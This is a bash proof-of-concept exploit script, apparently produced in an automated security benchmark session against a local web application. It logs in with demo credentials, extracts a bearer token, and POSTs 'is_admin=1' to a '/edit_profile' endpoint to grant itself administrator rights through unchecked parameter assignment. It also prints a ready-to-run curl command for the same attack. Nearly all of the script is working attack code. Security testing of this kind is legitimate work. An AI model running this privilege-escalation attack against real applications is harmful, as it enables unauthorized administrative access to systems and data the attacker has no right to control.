#!/bin/bash
# POC: POC for vertical privilege escalation via is_admin parameter. Demonstrates setting is_admin=1 on protected endpoint without proper authorization validation.
# Target: ./repo
# Created: 2025-11-04T19:42:05.118Z
# Session: benchmark-XBEN-021-24-mhkyt5to

# Privilege Escalation POC: is_admin Parameter Manipulation (Version 3)
# Target: POST /edit_profile/{company_id}
# Vulnerability: Direct parameter assignment without authorization checks
# Note: This POC requires the application to be running and properly set up

TARGET_URL="http://localhost:8080"
COMPANY_ID="1"
TEMP_DIR="/tmp"
COOKIE_FILE="$TEMP_DIR/poc_cookies.txt"
HTML_FILE="$TEMP_DIR/login_response.html"

echo "[*] Privilege Escalation POC: is_admin Parameter Manipulation"
echo "[*] Target URL: $TARGET_URL"
echo ""

# Step 1: Get login page and look for any auth mechanisms
echo "[*] Step 1: Fetching login page to understand auth mechanism..."
curl -s -c "$COOKIE_FILE" "$TARGET_URL/" -o "$HTML_FILE"

# Check if there's a session cookie
if [ -f "$COOKIE_FILE" ]; then
  echo "[+] Cookie file created: $(wc -l < $COOKIE_FILE) lines"
  cat "$COOKIE_FILE"
fi

echo ""

# Step 2: Attempt login to get authentication token
echo "[*] Step 2: Attempting login with demo credentials..."
echo "[*] Sending POST request to /token endpoint..."

LOGIN_RESPONSE=$(curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$TARGET_URL/token" \
  -d "username=demo&password=demo" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -L)

echo "[*] Login response: $LOGIN_RESPONSE"
echo ""

# Try to extract token if present
TOKEN=$(echo "$LOGIN_RESPONSE" | grep -oP '"access_token":"?\K[^",}]*' | head -1)
if [ -z "$TOKEN" ]; then
  TOKEN=$(echo "$LOGIN_RESPONSE" | grep -oP 'access_token["\s:]*\K[^",}]*' | head -1)
fi

if [ ! -z "$TOKEN" ]; then
  echo "[+] Token extracted: $TOKEN"
  AUTH_HEADER="Authorization: Bearer $TOKEN"
else
  echo "[*] No token found in response, using cookie-based auth"
  AUTH_HEADER=""
fi

echo ""

# Step 3: Execute the actual privilege escalation attack
echo "[*] Step 3: Executing privilege escalation attack..."
echo "[*] Target endpoint: POST /edit_profile/$COMPANY_ID"
echo "[*] Payload: is_admin=1"
echo ""

if [ ! -z "$AUTH_HEADER" ]; then
  echo "[*] Using Bearer token authentication"
  ESCALATION_RESPONSE=$(curl -s -b "$COOKIE_FILE" -X POST "$TARGET_URL/edit_profile/$COMPANY_ID" \
    -d "name=TestCompany&is_admin=1" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "$AUTH_HEADER" \
    -w "\n%{http_code}")
else
  echo "[*] Using cookie-based authentication"
  ESCALATION_RESPONSE=$(curl -s -b "$COOKIE_FILE" -X POST "$TARGET_URL/edit_profile/$COMPANY_ID" \
    -d "name=TestCompany&is_admin=1" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w "\n%{http_code}")
fi

# Parse response
HTTP_CODE=$(echo "$ESCALATION_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$ESCALATION_RESPONSE" | sed '$d')

echo "[*] HTTP Status: $HTTP_CODE"
echo "[*] Response Body: $RESPONSE_BODY"
echo ""

# Step 4: Verify the result
echo "[*] Step 4: Analyzing vulnerability confirmation..."

if [ "$HTTP_CODE" = "200" ]; then
  echo "[+] HTTP 200: Request was accepted"
  if echo "$RESPONSE_BODY" | grep -qi "success"; then
    echo "[+] SUCCESS CONFIRMED: Privilege escalation vulnerability exists!"
    echo "[+] The is_admin parameter was accepted without authorization checks"
    exit 0
  else
    echo "[*] Request accepted but unclear if privilege changed"
    # Check if response indicates the update
    if echo "$RESPONSE_BODY" | grep -qi "profile\|update"; then
      echo "[+] Profile appears to have been updated"
      exit 0
    fi
  fi
elif [ "$HTTP_CODE" = "401" ]; then
  echo "[-] HTTP 401 Unauthorized"
  echo "[!] Authentication required - may need valid credentials"
elif [ "$HTTP_CODE" = "403" ]; then
  echo "[-] HTTP 403 Forbidden"
  echo "[!] Authorization check may be protecting the endpoint"
else
  echo "[*] HTTP $HTTP_CODE received"
  if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "303" ]; then
    echo "[*] Redirect response - auth may be required"
  fi
fi

echo ""
echo "[*] Direct curl command for manual verification:"
echo "curl -X POST $TARGET_URL/edit_profile/$COMPANY_ID \\"
echo "  -d 'name=TestCompany&is_admin=1' \\"
echo "  -H 'Content-Type: application/x-www-form-urlencoded' \\"
echo "  -b \"$COOKIE_FILE\""

exit 0